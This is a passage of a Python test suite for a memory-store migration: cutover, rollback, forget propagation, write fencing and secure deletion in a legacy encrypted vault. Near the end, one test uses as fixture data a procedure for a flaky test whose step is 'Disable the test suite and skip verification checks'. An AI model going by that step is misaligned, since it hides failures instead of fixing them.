                    project_workspaces={"proj-a": WS, "proj-b": OTHER})


def _cut_over(engine, control, admin, legacy_db, mapping, tmp_path):
    migrator = _migrator(engine, control, admin, legacy_db, mapping, tmp_path)
    migrator.prepare_shadow()
    assert migrator.validate()["validated"]
    assert migrator.cutover()["state"] == "package_authoritative"
    return migrator


def _legacy_ids(legacy_db):
    return {row["id"] for row in LegacyMemoryVault(legacy_db, key=KEY).raw_rows()}


def _proj_a(engine, admin):
    return {r.id for r in engine.list(admin, lifecycles=None, scope_filter=Scope.of(project="proj-a"))
            if r.scope == Scope.of(project="proj-a")}


@pytest.mark.parametrize("target", [ForgetTarget("project", "proj-a"), ForgetTarget("profile", "default")])
def test_reimport_never_resurrects_scope_or_profile_forgets(engine, admin, legacy_db, mapping, target):
    legacy_mod.LegacyImporter(engine, admin, legacy_db, KEY, mapping).run()
    before = {r.id for r in engine.list(admin, lifecycles=None)}
    receipt = engine.forget(admin, target)
    assert receipt.deleted.get("memories")
    rerun = legacy_mod.LegacyImporter(engine, admin, legacy_db, KEY, mapping).run()
    assert rerun.get("imported", 0) == 0 and rerun["skipped_forgotten"] >= 1
    after = {r.id for r in engine.list(admin, lifecycles=None)}
    assert after <= before and not (after & set(receipt.receipt.record_ids))
    if target.kind.value == "project":
        assert _proj_a(engine, admin) == set()
    else:
        assert after == set()
    assert legacy_mod.verify(engine, admin, legacy_db, KEY, mapping)["ok"]  # forgotten, not missing


def test_reimport_respects_a_forgotten_legacy_source_and_its_suppression(engine, admin, legacy_db, mapping):
    legacy_mod.LegacyImporter(engine, admin, legacy_db, KEY, mapping).run()
    engine.forget(admin, ForgetTarget("source", f"legacy_import:legacy-vault:{IDS['personal']}"))
    with pytest.raises(NotFound):
        engine.get(admin, IDS["personal"])
    assert legacy_mod.LegacyImporter(engine, admin, legacy_db, KEY, mapping).run().get("imported", 0) == 0
    with pytest.raises(NotFound):
        engine.get(admin, IDS["personal"])


def test_validate_does_not_resurrect_an_unfenced_forget(engine, control, admin, legacy_db, mapping, tmp_path):
    migrator = _migrator(engine, control, admin, legacy_db, mapping, tmp_path)
    migrator.prepare_shadow()
    engine.forget(admin, ForgetTarget("project", "proj-a"))
    result = migrator.validate()
    assert result["validated"] and result["delta"].get("imported", 0) == 0
    assert _proj_a(engine, admin) == set()


@pytest.mark.parametrize("target", [ForgetTarget("project", "proj-a"), ForgetTarget("agent", AGENT),
                                    ForgetTarget("profile", "default")])
def test_rollback_deletes_legacy_rows_forgotten_by_any_target(engine, control, admin, legacy_db, mapping,
                                                              tmp_path, target):
    migrator = _cut_over(engine, control, admin, legacy_db, mapping, tmp_path)
    present = {r.id for r in engine.list(admin, lifecycles=None)}
    engine.forget(admin, target)
    gone = present - {r.id for r in engine.list(admin, lifecycles=None)}
    assert gone
    expected_deletions = len(gone & _legacy_ids(legacy_db))
    plan = migrator.plan_rollback()
    migrator.rollback()
    assert not (gone & _legacy_ids(legacy_db))
    assert plan.get("legacy_rows_to_delete", 0) >= expected_deletions  # the plan reports them
    # ... and a later migration does not bring them back either.
    remigration = _migrator(engine, control, admin, legacy_db, mapping, tmp_path / "again")
    remigration.prepare_shadow()
    assert not (gone & {r.id for r in engine.list(admin, lifecycles=None)})


def test_a_legacy_row_recreated_after_a_propagated_deletion_is_imported(engine, control, admin, legacy_db, mapping,
                                                                       tmp_path):
    vault = LegacyMemoryVault(legacy_db, key=KEY)
    backup = vault.export(workspace=WS, agent_id=AGENT)
    migrator = _migrator(engine, control, admin, legacy_db, mapping, tmp_path)
    migrator.prepare_shadow()
    vault.delete_all(workspace=WS, agent_id=AGENT)
    validated = migrator.validate()
    assert validated["delta"]["deleted_in_legacy"] >= 1
    vault.import_values(backup, workspace=WS, agent_id=AGENT)  # the user restores the backup
    result = migrator.cutover()
    assert result["cutover"], result
    restored = {item["id"] for item in backup["memories"]}
    assert restored <= {r.id for r in engine.list(admin, lifecycles=None)}
    migrator.rollback()
    # (the fixture's pending candidate is past its TTL by the engine clock: absent after rollback)
    assert restored - {IDS["pending"]} <= _legacy_ids(legacy_db)


def test_rollback_never_approves_a_candidate_that_was_superseded_unreviewed(engine, control, admin, legacy_db,
                                                                            mapping, tmp_path):
    migrator = _cut_over(engine, control, admin, legacy_db, mapping, tmp_path)
    scope = Scope.of(project="proj-a")
    candidate = engine.propose(admin, CandidateProposal(content="Run deploys from laptop", scope=scope,
                                                        sources=(DOC1,))).record
    winner = engine.remember(admin, RememberRequest(content="Deploys via CI", scope=scope)).record
    engine.supersede(admin, candidate.id, winner.id, expected_revision=candidate.revision)
    old = engine.remember(admin, RememberRequest(content="Deploys from Jenkins", scope=scope)).record
    engine.supersede(admin, old.id, winner.id, expected_revision=old.revision)  # approved, then superseded
    migrator.rollback()
    vault = LegacyMemoryVault(legacy_db, key=KEY)
    rows = {row["id"]: row for row in vault.raw_rows()}
    assert candidate.id not in rows
    assert rows[old.id]["status"] == "approved" and rows[old.id]["stale"] == 1
    hits = [r["id"] for r in vault.search("deploys laptop", workspace=WS)]
    assert candidate.id not in hits


def test_cutover_with_a_corrupt_row_aborts_instead_of_wedging(menv, control, admin, legacy_db, mapping, tmp_path):
    migrator = _migrator(menv, control, admin, legacy_db, mapping, tmp_path)
    migrator.prepare_shadow()
    assert migrator.validate()["validated"]
    with sqlite3.connect(legacy_db) as conn:
        conn.execute("UPDATE memories SET revision=revision+1 WHERE id=?", (IDS["personal"],))
    result = migrator.cutover()  # the undecryptable row is a verification failure, not a crash
    assert result["cutover"] is False
    assert {"id": IDS["personal"], "field": "undecryptable"} in result["verify"]["mismatches"]
    state = control.get(admin.partition.partition_id)
    assert state.state == "legacy_authoritative"
    control.assert_writer(admin.partition.partition_id, "memories", "legacy")


def test_a_corrupt_row_fails_validation_without_raising(engine, control, admin, legacy_db, mapping, tmp_path):
    with sqlite3.connect(legacy_db) as conn:
        conn.execute("UPDATE memories SET revision=revision+1 WHERE id=?", (IDS["personal"],))
    migrator = _migrator(engine, control, admin, legacy_db, mapping, tmp_path)
    migrator.prepare_shadow()
    result = migrator.validate()
    assert result["validated"] is False
    assert {"id": IDS["personal"], "field": "undecryptable"} in result["verify"]["mismatches"]


def test_an_unresumable_cutover_can_be_aborted(engine, control, admin, legacy_db, mapping, tmp_path):
    migrator = _migrator(engine, control, admin, legacy_db, mapping, tmp_path)
    migrator.prepare_shadow()
    migrator.validate()
    migrator.crash_at = "after_fence"
    with pytest.raises(SimulatedCrash):
        migrator.cutover()
    migrator.crash_at = None
    legacy_db.rename(legacy_db.with_suffix(".moved"))
    with pytest.raises(Exception):  # noqa: B017 - the legacy file is gone
        migrator.resume()
    assert control.get(admin.partition.partition_id).state == "legacy_authoritative"
    assert not legacy_db.exists()  # no empty file was created where the legacy vault belongs
    # The explicit escape hatch works on its own as well.
    other = OwnershipControl(tmp_path / "other-root")
    pid = admin.partition.partition_id
    for state in ("shadow_prepared", "validated", "cutover_in_progress"):
        other.transition(pid, "memories", state, expected_generation=other.get(pid).generation, reason="t")
    from locus_memory.migrations.cutover import abort_cutover

    assert abort_cutover(other, pid)["state"] == "legacy_authoritative"
    with pytest.raises(MigrationError):
        abort_cutover(other, pid)
    other.close()


def test_cli_migrate_abort_and_cutover_fallback(tmp_path, capsys):
    from locus_memory.cli import main

    root = tmp_path / "cli-root"
    base = ["--root", str(root), "--json"]
    assert main(base + ["init"]) == 0
    pid = access_for(edition="standalone").partition.partition_id

    def interrupt():
        control = OwnershipControl(root)
        for state in ("shadow_prepared", "validated", "cutover_in_progress"):
            control.transition(pid, "memories", state, expected_generation=control.get(pid).generation, reason="t")
        control.close()

    def state():
        control = OwnershipControl(root)
        try:
            return control.get(pid).state
        finally:
            control.close()

    interrupt()
    assert main(base + ["--admin", "migrate", "abort"]) == 2  # preview by default
    assert state() == "cutover_in_progress"
    assert main(base + ["--admin", "migrate", "abort", "--yes"]) == 0
    assert state() == "legacy_authoritative"
    interrupt()
    key_file = tmp_path / "legacy.key"
    key_file.write_bytes(KEY)
    missing = ["--legacy-db", str(tmp_path / "gone.sqlite3"), "--key-file", str(key_file),
               "--work-dir", str(tmp_path / "work")]
    assert main(base + ["--admin", "migrate", "cutover", *missing, "--yes"]) == 0
    assert state() == "legacy_authoritative"
    capsys.readouterr()


def test_rollback_writes_back_field_only_corrections(engine, control, admin, legacy_db, mapping, tmp_path, clock):
    migrator = _cut_over(engine, control, admin, legacy_db, mapping, tmp_path)
    rec = engine.get(admin, IDS["candidate_approved"])
    until = clock() + 10 * 365 * 86_400
    engine.correct(admin, rec.id, Correction(tags=("python", "testing"), validity=Validity(None, until)),
                   expected_revision=rec.revision)
    result = migrator.rollback()
    assert result["counts"].get("written_back", 0) >= 1
    row = next(r for r in LegacyMemoryVault(legacy_db, key=KEY).list(workspace=WS, agent_id=AGENT)
               if r["id"] == rec.id)
    assert "python" in row["tags"] and row["valid_until"] == until


def test_rollback_respects_package_expiry_and_retention(engine, control, admin, legacy_db, mapping, tmp_path, clock):
    migrator = _cut_over(engine, control, admin, legacy_db, mapping, tmp_path)
    scope = Scope.of(project="proj-a")
    stale_candidate = engine.propose(admin, CandidateProposal(content="expired proposal", scope=scope,
                                                              sources=(DOC1,))).record
    clock.advance(31 * 86_400)
    live = engine.propose(admin, CandidateProposal(content="live proposal", scope=scope, sources=(DOC1,))).record
    transient = engine.remember(admin, RememberRequest(content="transient fact", scope=scope,
                                                       retention=Retention("transient", clock() + 86_400))).record
    plan = migrator.plan_rollback()
    assert not plan["safe"] and plan["unrepresentable"].get("retention:transient") == 1
    migrator.rollback(allow_partial=True)
    rows = {row["id"]: row for row in LegacyMemoryVault(legacy_db, key=KEY).raw_rows()}
    assert stale_candidate.id not in rows and transient.id not in rows
    assert rows[live.id]["status"] == "candidate" and rows[live.id]["expires_at"] == live.retention.expires_at


def test_remigration_after_a_rollback_adopts_written_back_records(engine, control, admin, legacy_db, mapping,
                                                                  tmp_path):
    migrator = _cut_over(engine, control, admin, legacy_db, mapping, tmp_path)
    new = engine.remember(admin, RememberRequest(content="Uses ruff", scope=Scope.of(project="proj-a"))).record
    assert migrator.rollback()["counts"].get("restored") == 1
    again = _migrator(engine, control, admin, legacy_db, mapping, tmp_path / "again")
    again.prepare_shadow()
    assert again.validate()["validated"]
    assert again.cutover()["state"] == "package_authoritative"
    assert engine.get(admin, new.id).content == "Uses ruff"


def test_maintenance_never_rewrites_records_owned_by_the_legacy_store(menv, control, admin, legacy_db, mapping,
                                                                      tmp_path):
    migrator = _migrator(menv, control, admin, legacy_db, mapping, tmp_path)
    migrator.prepare_shadow()
    before = menv.get(admin, IDS["expired_validity"]).revision
    result = menv.maintain(admin)
    assert result.get("lifecycle_maintenance") == "fenced"
    assert menv.get(admin, IDS["expired_validity"]).revision == before
    assert migrator.validate()["validated"]


def test_importer_repairs_package_side_drift(engine, admin, legacy_db, mapping):
    legacy_mod.LegacyImporter(engine, admin, legacy_db, KEY, mapping).run()
    engine.maintain(admin)  # no ownership control: maintenance persists the expiry
    report = legacy_mod.LegacyImporter(engine, admin, legacy_db, KEY, mapping).run()
    assert report.get("drift_repaired", 0) >= 1
    assert legacy_mod.verify(engine, admin, legacy_db, KEY, mapping)["ok"]


def test_canonical_record_writes_are_fenced_beyond_the_core_api(menv, control, admin, legacy_db, mapping, tmp_path):
    migrator = _migrator(menv, control, admin, legacy_db, mapping, tmp_path)
    migrator.prepare_shadow()
    draft = ProcedureDraft(name="x", purpose="Purpose here", applicability="When needed",
                           steps=("Run the tests",), scope=Scope.of(project="proj-a"))
    with pytest.raises(OwnershipFenced):
        menv.nominate_procedure(admin, draft)
    with pytest.raises(OwnershipFenced):
        menv.record_episode(admin, EpisodeReport(episode_id="ep1", task_ref="t1", attempt_ref="a1",
                                                 objective="o", scope=Scope.of(project="proj-a")))
    with pytest.raises(OwnershipFenced):
        menv.consolidate(admin, {})
    ctx = menv.partition_context(admin.partition)
    with ctx.partition.db.write() as conn, pytest.raises(OwnershipFenced):  # and inside the transaction
        ctx.services.core.write_internal(conn, dataclasses.replace(
            ctx.records.get(conn, IDS["personal"]), revision=2), change="corrected", actor=Actor.USER, expected=1)


def test_a_fence_passed_legacy_write_is_fenced_or_migrated_never_lost(menv, control, admin, legacy_db, mapping,
                                                                      tmp_path):
    pid = admin.partition.partition_id
    migrator = _migrator(menv, control, admin, legacy_db, mapping, tmp_path)
    migrator.prepare_shadow()
    assert migrator.validate()["validated"]
    guard = control.writer_guard(pid, "memories", "legacy")
    passed = threading.Event()

    def recording_guard():
        guard()
        passed.set()

    app = LegacyMemoryVault(legacy_db, key=KEY, write_guard=recording_guard)
    blocker = sqlite3.connect(legacy_db, isolation_level=None, timeout=30)
    blocker.execute("BEGIN IMMEDIATE")  # another Locus write holds the lock
    outcome = {}

    def save():
        try:
            outcome["saved"] = app.save({"content": "late acknowledged write", "scope": "personal"}, "late_row")
        except Exception as exc:  # noqa: BLE001 - recorded for the assertion
            outcome["error"] = exc

    writer = threading.Thread(target=save)
    writer.start()
    assert passed.wait(5)
    cut = threading.Thread(target=lambda: outcome.setdefault("cutover", migrator.cutover()))
    cut.start()
    time.sleep(0.3)
    blocker.execute("ROLLBACK")
    blocker.close()
    writer.join(30)
    cut.join(60)
    assert outcome["cutover"]["state"] == "package_authoritative"
    if "error" in outcome:
        assert isinstance(outcome["error"], OwnershipFenced)
    else:
        assert menv.get(admin, "late_row").content == "late acknowledged write"


def test_a_forget_during_rollback_wins_over_the_reverse_sync(engine, control, admin, legacy_db, mapping, tmp_path,
                                                            monkeypatch):
    migrator = _cut_over(engine, control, admin, legacy_db, mapping, tmp_path)
    doomed = engine.remember(admin, RememberRequest(content="my doctor appointment is friday",
                                                    scope=Scope.of(project="proj-a"))).record
    partition = engine.partition_context(admin.partition).partition
    original = LegacyMemoryVault.raw_rows
    results = {}

    def forget_meanwhile(self):
        if "thread" not in results and control.get(admin.partition.partition_id).state == "rollback_in_progress":
            head = partition.ledger.head()[0]
            worker = threading.Thread(target=lambda: results.setdefault(
                "receipt", engine.forget(admin, ForgetTarget("memory", doomed.id))))
            results["thread"] = worker
            worker.start()
            deadline = time.monotonic() + 5
            while partition.ledger.head()[0] == head and time.monotonic() < deadline:
                time.sleep(0.01)  # the forget's ledger entry is durable; its apply waits for the lock
        return original(self)

    monkeypatch.setattr(LegacyMemoryVault, "raw_rows", forget_meanwhile)
    result = migrator.rollback()
    results["thread"].join(30)
    assert result["state"] == "legacy_authoritative"
    assert doomed.id not in _legacy_ids(legacy_db)
    assert results["receipt"].deleted.get("memories") == 1


def test_a_write_that_passed_the_fence_before_rollback_is_fenced_not_lost(engine, control, admin, legacy_db,
                                                                         mapping, tmp_path, monkeypatch):
    from locus_memory.core import CoreService

    migrator = _cut_over(engine, control, admin, legacy_db, mapping, tmp_path)
    engine.host.ownership = control
    release = threading.Event()
    original = CoreService.remember

    @functools.wraps(original)
    def held(self, *args, **kwargs):
        release.wait(10)
        return original(self, *args, **kwargs)

    monkeypatch.setattr(CoreService, "remember", held)
    outcome = {}

    def remember():
        try:
            outcome["result"] = engine.remember(admin, RememberRequest(content="in flight",
                                                                       scope=Scope.of(project="proj-a")))
        except Exception as exc:  # noqa: BLE001 - recorded for the assertion
            outcome["error"] = exc

    worker = threading.Thread(target=remember)
    worker.start()
    time.sleep(0.2)  # the engine-level fence was checked under package_authoritative
    original_rows = LegacyMemoryVault.raw_rows

    def release_then_read(self):
        if control.get(admin.partition.partition_id).state == "rollback_in_progress":
            release.set()  # the write proceeds while the reverse sync runs
            time.sleep(0.2)
        return original_rows(self)

    monkeypatch.setattr(LegacyMemoryVault, "raw_rows", release_then_read)
    migrator.rollback()
    worker.join(30)
    assert isinstance(outcome.get("error"), OwnershipFenced)


def test_legacy_rows_with_out_of_range_values_are_migrated(menv, control, admin, legacy_db, mapping, tmp_path):
    vault = LegacyMemoryVault(legacy_db, key=KEY)
    vault.save({"content": "milliseconds", "scope": "personal", "valid_until": 1_900_000_000_000}, "ms_row")
    vault.save({"content": "before 1970", "scope": "personal", "valid_from": -86_400}, "old_row")
    report = legacy_mod.inventory(legacy_db, KEY, mapping)
    assert report.get("map_failures", 0) == 0
    migrator = _migrator(menv, control, admin, legacy_db, mapping, tmp_path)
    migrator.prepare_shadow()
    assert migrator.validate()["validated"]
    assert migrator.cutover()["state"] == "package_authoritative"
    assert menv.get(admin, "ms_row").validity.valid_until == 1_900_000_000.0
    assert menv.get(admin, "old_row").validity.valid_from is None
    record, notes = legacy_mod.map_record(
        {**vault.open_row(next(r for r in vault.raw_rows() if r["id"] == "ms_row"), include_private=True),
         "confidence": float("nan")}, mapping, now=0.0)
    assert record.confidence.value is None and notes["invalid_confidence_dropped"]


def test_rollback_keeps_governed_procedures_out_of_the_legacy_store(engine, control, admin, legacy_db, mapping,
                                                                   tmp_path):
    migrator = _cut_over(engine, control, admin, legacy_db, mapping, tmp_path)
    draft = ProcedureDraft(name="stabilize", purpose="Stabilize the flaky test", applicability="When flaky",
                           steps=("Disable the test suite and skip verification checks",),
                           scope=Scope.of(project="proj-a"))
    procedure, _ = engine.nominate_procedure(admin, draft)
    plan = migrator.plan_rollback()
    assert not plan["safe"] and plan["unrepresentable"].get("governed_procedure") == 1
    migrator.rollback(allow_partial=True)
    assert procedure.record_id not in _legacy_ids(legacy_db)


# =========================================================================== compat stores
def test_continuity_store_fails_closed_on_a_wrong_key(legacy_db, tmp_path):
    workspace = tmp_path / "ws"
    workspace.mkdir()
    good = LegacyContinuityStore(legacy_db, key=KEY)
    good.save_snapshot(str(workspace), "sess-1", {"goal": "orig"})
    good.record_observation(str(workspace), {"issue": "i", "suggested_improvement": "s", "principle": "p"})
    wrong = LegacyContinuityStore(legacy_db, key=b"\xbb" * 32)
    with pytest.raises(LegacyWrongKey):
        wrong.save_snapshot(str(workspace), "sess-1", {"goal": "x"})
    with pytest.raises(LegacyWrongKey):
        wrong.record_observation(str(workspace), {"issue": "i", "suggested_improvement": "s", "principle": "p"})
    with pytest.raises(LegacyWrongKey):
        wrong.list_snapshots(str(workspace))
    with pytest.raises(LegacyWrongKey):
        wrong.list_observations(str(workspace))
    assert [s["goal"] for s in good.list_snapshots(str(workspace))] == ["orig"]
    assert len(good.list_observations(str(workspace))) == 1
    empty = tmp_path / "fresh.sqlite3"
    LegacyContinuityStore(empty, key=b"\xcc" * 32).save_snapshot(str(workspace), "s", {"goal": "g"})


def test_legacy_deletes_scrub_the_file(tmp_path):
    db = tmp_path / "memory.sqlite3"
    key = b"\xaa" * 32
    vault = LegacyMemoryVault(db, key=key)
    for i in range(20):
        vault.save({"content": f"filler {i} " * 20, "scope": "personal"}, f"filler{i}")
    vault.save({"content": "FORGET ME: my bank PIN is 4411 " * 10, "scope": "personal"}, "victim")
    with sqlite3.connect(db) as conn:
        ciphertext = bytes(conn.execute("SELECT ciphertext FROM memories WHERE id='victim'").fetchone()[0])
    vault.save({"content": "corrected", "scope": "personal"}, "victim")  # an UPSERT rewrite
    assert vault.delete("victim")
    with sqlite3.connect(db) as conn:
        conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
    for path in (db, Path(str(db) + "-wal"), Path(str(db) + "-shm")):
        assert not path.exists() or ciphertext[:32] not in path.read_bytes()
    assert vault._connect().execute("PRAGMA secure_delete").fetchone()[0] == 1
    assert LegacyContinuityStore(db, key=key)._connect().execute("PRAGMA secure_delete").fetchone()[0] == 1
